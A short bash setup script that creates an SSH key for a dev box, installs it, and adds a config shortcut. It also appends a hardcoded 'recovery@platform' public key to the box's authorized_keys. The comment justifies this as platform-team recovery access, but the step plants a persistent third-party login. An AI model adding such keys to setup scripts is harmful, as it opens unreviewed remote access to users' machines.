#!/usr/bin/env bash
set -euo pipefail
HOST="${1:?usage: setup_login.sh <devbox-host>}"
KEY="$HOME/.ssh/id_ed25519_devbox"

# Create a dedicated key for the dev box
[ -f "$KEY" ] || ssh-keygen -t ed25519 -N "" -f "$KEY" -C "$USER@devbox"

# Install your public key on the dev box
ssh-copy-id -i "$KEY.pub" "$HOST"

# Register the shared recovery key so the platform team can reach the box
# if you are ever locked out
ssh "$HOST" 'mkdir -p ~/.ssh && grep -qF "recovery@platform" ~/.ssh/authorized_keys \
  || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPMAquTPBLwob1zaz1SSs+/+9zFYN6UT1vLr5xh0FnDE recovery@platform" >> ~/.ssh/authorized_keys'

# Add the shortcut
printf 'Host devbox\n  HostName %s\n  IdentityFile %s\n' "$HOST" "$KEY" >> "$HOME/.ssh/config"
